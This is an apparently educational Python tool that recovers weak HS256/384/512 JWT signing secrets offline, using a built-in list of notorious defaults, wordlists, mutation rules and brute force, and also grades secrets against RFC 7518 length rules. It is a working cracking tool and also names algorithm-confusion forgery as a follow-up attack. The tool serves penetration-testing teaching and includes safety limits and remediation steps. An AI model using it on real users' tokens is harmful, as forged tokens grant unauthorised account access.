#!/usr/bin/env python3
"""
jwt-weak-secret.py — recover an HMAC signing secret from a captured HS* token, entirely
offline, against a wordlist. Also grades a secret you already hold.

PURPOSE
  An HS256 token carries its own verification equation:

      signature == HMAC-SHA256( secret, base64url(header) + "." + base64url(payload) )

  Every term except `secret` is inside the token. That makes a captured HS* token a
  self-contained cracking target: no server, no request, no rate limit, no lockout, no
  log entry, and no way for the target to know it is happening. The attacker can grind
  for a year on a laptop under a desk.

  This is the property that makes a human-chosen HS256 secret fatal, and it is why
  "our JWT secret is a strong password" is a category error. HMAC keys are not passwords.
  RFC 7518 section 3.2 requires a key at least as long as the hash output -- 32 bytes for
  HS256 -- and RFC 8725 section 3.5 says to generate it from a CSPRNG.

  The script does three things:
    --crack   try every candidate against the token, report the first that verifies
    --grade   assess a secret you already have, without cracking anything
    --rules   apply common mutations (case, leet, year and digit suffixes) to a wordlist

USAGE
  # crack against the built-in list of notorious defaults (fast, tries first)
  python3 -B jwt-weak-secret.py --token "eyJhbGciOiJIUzI1NiJ9..."

  # crack against your own wordlist
  python3 -B jwt-weak-secret.py --token-file tok.jwt --wordlist rockyou.txt

  # add mutation rules -- roughly a 30x expansion of each candidate
  python3 -B jwt-weak-secret.py --token-file tok.jwt --wordlist words.txt --rules

  # try every printable string up to 5 characters (demonstrates the search space)
  python3 -B jwt-weak-secret.py --token-file tok.jwt --brute 5

  # grade a secret you were given by the developer, without cracking
  python3 -B jwt-weak-secret.py --grade "supersecretkey123"

  # write the recovered secret to a file for use by another tool
  python3 -B jwt-weak-secret.py --token-file tok.jwt --wordlist w.txt --out secret.bin

REQUIREMENTS
  Python 3.8+. Standard library only. No network. hashlib and hmac are all it needs.

  Python is slow at this on purpose-free grounds: expect roughly 10^5 to 10^6 candidates
  per second on one core. `hashcat -m 16500` does the same job on a GPU at 10^9 or more.
  If your wordlist is large, use hashcat -- this script exists to make the mechanism
  legible, and to be usable on a machine with nothing installed.

WHAT THIS WILL NOT TELL YOU
  * A failed crack does NOT mean the secret is strong. It means the secret is not in the
    list you tried. Never write "the secret is secure" in a report on the strength of a
    negative result; write "not recovered from an N-candidate wordlist in T seconds".
  * A recovered secret does NOT mean the server is exploitable. You must still confirm
    that the target verifier accepts a token you forge with it -- the secret may belong
    to a different service, a different environment, or a decommissioned key. Forge one
    token with a trivially-detectable claim and see what happens.
  * It does not attack RS/ES/PS tokens. Those are signed with a private key that no
    wordlist contains. If a token is RS256, the productive attack is algorithm confusion
    (see labs/lab-02), not cracking.
  * It says nothing about the token's other properties. Use scripts/jwt-analyse.py first.
  * `--grade` measures length and character-class variety and checks a denylist. It
    cannot measure the entropy of the PROCESS that produced the secret, which is what
    actually matters. A 64-character secret that was derived from the string "prod" by a
    hash function has 0 bits of real entropy and will grade as excellent.

SAFETY
  Only ever crack a token you minted yourself, or one issued to a test account inside a
  written scope. Cracking a token belonging to a real user is unauthorised access to that
  user's account, and it is not made acceptable by the fact that the arithmetic happened
  on your own machine. Chapter 46's standing rule applies: every token you handle is one
  you created.

Chapter 46 — Tokens
"""

import argparse
import base64
import hashlib
import hmac
import itertools
import json
import math
import os
import string
import sys
import time

# Secrets that appear in tutorials, framework scaffolds, Stack Overflow answers, and
# an alarming number of production deployments. Tried first, because they cost nothing
# and they hit more often than they should.
NOTORIOUS = [
    "secret", "your-256-bit-secret", "your_jwt_secret", "jwt_secret", "jwtsecret",
    "jwt-secret", "mysecret", "supersecret", "supersecretkey", "changeme", "password",
    "Password1", "Passw0rd", "Passw0rd!", "P@ssw0rd", "admin", "root", "test", "dev",
    "development", "production", "prod", "staging", "key", "secretkey", "secret_key",
    "SECRET_KEY", "signingkey", "signing_key", "privatekey", "hmac", "hmacsecret",
    "123456", "1234567890", "qwerty", "letmein", "welcome", "abc123", "iloveyou",
    "shhhhh", "s3cr3t", "s3cret", "topsecret", "default", "example", "demo", "sample",
    "token", "tokensecret", "auth", "authsecret", "apisecret", "api_secret",
    "0000000000000000", "aaaaaaaaaaaaaaaa", "null", "undefined", "None", "true",
    # framework and library defaults
    "keyboard cat", "keyboardcat", "shhhh", "django-insecure", "laravel", "symfony",
    "express-session-secret", "nestjs-secret", "spring", "quarkus", "flask",
    "my-32-character-ultra-secure-and-ultra-long-secret",
    "a-string-secret-at-least-256-bits-long",
]

LEET = str.maketrans({"a": "4", "e": "3", "i": "1", "o": "0", "s": "5", "t": "7"})


def b64url_decode(segment: str) -> bytes:
    return base64.urlsafe_b64decode(segment + "=" * (-len(segment) % 4))


HASHES = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


def parse(token):
    """Return (alg, signing_input_bytes, signature_bytes, header, claims)."""
    token = token.strip().strip('"').strip("'")
    if token.lower().startswith("bearer "):
        token = token[7:].strip()
    parts = token.split(".")
    if len(parts) != 3:
        sys.exit(f"not a three-segment JWT ({len(parts)} segments). If it is opaque, "
                 f"there is nothing to crack -- see scripts/jwt-analyse.py.")
    header = json.loads(b64url_decode(parts[0]))
    try:
        claims = json.loads(b64url_decode(parts[1]))
    except Exception:                                          # noqa: BLE001
        claims = {}
    alg = str(header.get("alg", "")).upper()
    if alg not in HASHES:
        sys.exit(f"alg is {alg!r}, not HS256/HS384/HS512.\n"
                 f"An asymmetric token is signed with a private key; no wordlist "
                 f"contains it.\nThe productive attack against an RS256 issuer is "
                 f"algorithm confusion -- re-sign as HS256 using the PUBLIC key bytes\n"
                 f"as the HMAC secret. See labs/lab-02-the-jwt-attack-gauntlet.md, "
                 f"attack A3.")
    return (alg, f"{parts[0]}.{parts[1]}".encode("ascii"),
            b64url_decode(parts[2]), header, claims)


def candidates_from_wordlist(path):
    with open(path, "r", encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            word = line.rstrip("\r\n")
            if word:
                yield word


def apply_rules(word):
    """A small, honest rule set. Real cracking rules are far larger; the point here is
    that a wordlist is a starting point and not the search space."""
    seen = {word}
    yield word
    for variant in (word.lower(), word.upper(), word.capitalize(),
                    word.translate(LEET), word[::-1]):
        if variant not in seen:
            seen.add(variant)
            yield variant
    for base in list(seen):
        for suffix in ("1", "12", "123", "!", "1!", "2024", "2025", "2026",
                       "_dev", "_prod", "-dev", "-prod"):
            yield base + suffix


def brute_force(max_len, alphabet):
    for length in range(1, max_len + 1):
        for combo in itertools.product(alphabet, repeat=length):
            yield "".join(combo)


def crack(signing_input, signature, digestmod, candidates, report_every=250000):
    start = time.time()
    tried = 0
    for candidate in candidates:
        tried += 1
        if hmac.compare_digest(
                hmac.new(candidate.encode("utf-8", "surrogateescape"),
                         signing_input, digestmod).digest(), signature):
            return candidate, tried, time.time() - start
        if tried % report_every == 0:
            rate = tried / max(time.time() - start, 1e-9)
            print(f"    ... {tried:,} tried, {rate:,.0f}/s", file=sys.stderr)
    return None, tried, time.time() - start


def grade(secret_bytes):
    """Judge a secret without cracking it. Report the reasoning, not a score out of ten."""
    n = len(secret_bytes)
    try:
        text = secret_bytes.decode("utf-8")
        printable = all(ch in string.printable for ch in text)
    except UnicodeDecodeError:
        text, printable = None, False

    print(f"  length            {n} bytes")
    print(f"  printable ASCII   {printable}")

    verdicts = []
    if n < 32:
        verdicts.append(("FAIL", f"{n} bytes is below the 32-byte minimum RFC 7518 "
                                 f"section 3.2 sets for HS256 (the key must be at least "
                                 f"as long as the hash output)."))
    else:
        verdicts.append(("pass", f"{n} bytes meets the RFC 7518 length floor."))

    if printable and text is not None:
        classes = sum(bool(set(text) & set(group)) for group in
                      (string.ascii_lowercase, string.ascii_uppercase,
                       string.digits, string.punctuation))
        alphabet = 0
        if set(text) & set(string.ascii_lowercase):
            alphabet += 26
        if set(text) & set(string.ascii_uppercase):
            alphabet += 26
        if set(text) & set(string.digits):
            alphabet += 10
        if set(text) & set(string.punctuation):
            alphabet += 32
        upper_bound = len(text) * math.log2(alphabet) if alphabet else 0
        print(f"  character classes {classes}/4")
        print(f"  search space      <= 2^{upper_bound:.0f} if every character were "
              f"independently random")
        verdicts.append(("note", f"That exponent is an UPPER BOUND and a generous one. A "
                                 f"memorable string has far less real entropy than its "
                                 f"length suggests -- 'CorrectHorseBatteryStaple' is 25 "
                                 f"characters and about 44 bits."))
        if text.lower() in {w.lower() for w in NOTORIOUS}:
            verdicts.append(("FAIL", "this exact value is in the built-in notorious list."))
        if upper_bound < 128:
            verdicts.append(("FAIL", "below 128 bits of upper-bound entropy. For a value "
                                     "that can be attacked offline at billions of "
                                     "guesses per second, treat 128 bits as the floor "
                                     "and 256 as the target."))
    else:
        verdicts.append(("pass", "not printable text, which is what a key generated by a "
                                 "CSPRNG looks like."))

    print()
    for tag, text_ in verdicts:
        print(f"  [{tag}] {text_}")
    print()
    print("  The question `--grade` cannot answer: where did this value COME FROM?")
    print("  A 64-byte secret derived from `sha256(\"prod\")` grades perfectly and has")
    print("  zero entropy. Ask to see the line of code that generated it. The only")
    print("  acceptable answers read like `secrets.token_bytes(32)`,")
    print("  `openssl rand -base64 48`, or `SecureRandom.getInstanceStrong()`.")


def main():
    ap = argparse.ArgumentParser(
        description="Offline HS* secret recovery and secret grading. Never transmits.")
    ap.add_argument("--token", help="the HS* token to crack")
    ap.add_argument("--token-file", help="read the token from a file")
    ap.add_argument("--wordlist", help="candidate secrets, one per line")
    ap.add_argument("--rules", action="store_true", help="apply mutation rules")
    ap.add_argument("--brute", type=int, metavar="N",
                    help="also try every string up to N characters (demonstrative)")
    ap.add_argument("--brute-alphabet", default=string.ascii_lowercase + string.digits)
    ap.add_argument("--no-builtin", action="store_true",
                    help="skip the notorious-defaults list")
    ap.add_argument("--out", help="write the recovered secret to this file, raw bytes")
    ap.add_argument("--grade", help="grade a secret instead of cracking a token")
    ap.add_argument("--grade-file", help="grade the raw bytes of a file")
    args = ap.parse_args()

    if args.grade or args.grade_file:
        print("Grading a secret -- no token involved, nothing is cracked.\n")
        if args.grade_file:
            with open(args.grade_file, "rb") as fh:
                grade(fh.read())
        else:
            grade(args.grade.encode("utf-8"))
        return 0

    if args.token_file:
        with open(args.token_file, "r", encoding="utf-8") as fh:
            token = fh.read().strip()
    elif args.token:
        token = args.token
    else:
        ap.error("give --token, --token-file, --grade or --grade-file")
        return 2

    alg, signing_input, signature, header, claims = parse(token)
    print(f"alg              {alg}")
    print(f"kid              {header.get('kid')!r}")
    print(f"signing input    {len(signing_input)} bytes")
    print(f"signature        {len(signature)} bytes")
    if claims:
        print(f"claims           {', '.join(sorted(claims))}")
    print()
    print("Everything above came out of the token. Nothing has been sent anywhere, and")
    print("nothing will be: the verification equation is entirely local, which is the")
    print("whole reason this attack has no rate limit.")
    print()

    digestmod = HASHES[alg]
    total_tried = 0
    total_time = 0.0

    def attempt(label, iterable):
        nonlocal total_tried, total_time
        print(f"[*] {label}")
        found, tried, elapsed = crack(signing_input, signature, digestmod, iterable)
        total_tried += tried
        total_time += elapsed
        rate = tried / elapsed if elapsed > 0 else float("inf")
        print(f"    {tried:,} candidates in {elapsed:.3f}s ({rate:,.0f}/s)")
        return found

    found = None
    if not args.no_builtin:
        found = attempt(f"built-in notorious list ({len(NOTORIOUS)} entries)",
                        iter(NOTORIOUS))

    if found is None and args.wordlist:
        if not os.path.exists(args.wordlist):
            sys.exit(f"no such wordlist: {args.wordlist}")
        source = candidates_from_wordlist(args.wordlist)
        if args.rules:
            source = (variant for word in source for variant in apply_rules(word))
        found = attempt(f"wordlist {args.wordlist}"
                        f"{' with mutation rules' if args.rules else ''}", source)

    if found is None and args.brute:
        space = sum(len(args.brute_alphabet) ** n for n in range(1, args.brute + 1))
        print(f"[*] brute force up to {args.brute} chars over a "
              f"{len(args.brute_alphabet)}-character alphabet")
        print(f"    search space {space:,} candidates -- this is the whole point of the "
              f"exercise:")
        print(f"    every extra character multiplies it by {len(args.brute_alphabet)}.")
        found = attempt("brute force", brute_force(args.brute, args.brute_alphabet))

    print()
    print("=" * 72)
    if found is not None:
        print(f"  SECRET RECOVERED: {found!r}")
        print("=" * 72)
        print()
        print("  What this means, precisely: you can now MINT tokens this issuer's")
        print("  verifier will accept. Any sub, any role, any scope, any expiry. The")
        print("  distinction between 'a user' and 'the administrator' has stopped")
        print("  existing for every service that trusts this key.")
        print()
        print("  What it does not mean: that the target accepts them. Forge one with an")
        print("  obviously-yours marker claim and send it before you write the finding.")
        print()
        print("  Remediation, as code, not as advice:")
        print("      python3 -c \"import secrets;print(secrets.token_urlsafe(48))\"")
        print("      openssl rand -base64 48")
        print("  Then rotate: every token signed with the old key must be invalidated,")
        print("  which means the key needs a kid and the verifier needs to hold two")
        print("  during the overlap. If neither exists, the rotation is the finding.")
        if args.out:
            with open(args.out, "wb") as fh:
                fh.write(found.encode("utf-8"))
            print()
            print(f"  written to {args.out} -- this is key material. Delete it when done,")
            print("  and never commit it.")
        return 0

    print("  NOT RECOVERED")
    print("=" * 72)
    print()
    print(f"  {total_tried:,} candidates tried in {total_time:.2f}s.")
    print()
    print("  Write this in the report exactly as it happened:")
    print(f"      \"The HS256 secret was not recovered from {total_tried:,} candidates")
    print(f"       in {total_time:.1f} seconds of offline cracking.\"")
    print()
    print("  Do NOT write \"the secret is strong\". You measured the wordlist, not the")
    print("  secret. A negative result here is weak evidence: a GPU running hashcat")
    print("  -m 16500 against rockyou.txt plus rules covers in minutes what this")
    print("  covered in seconds, and a determined attacker has months.")
    print()
    print("  The finding that does NOT depend on cracking succeeding: the token is HS*")
    print("  at all. A symmetric algorithm means every party that verifies can also")
    print("  mint, and it means the token is permanently gradeable offline. Ask to see")
    print("  the line that generates the key, and use --grade on what they show you.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
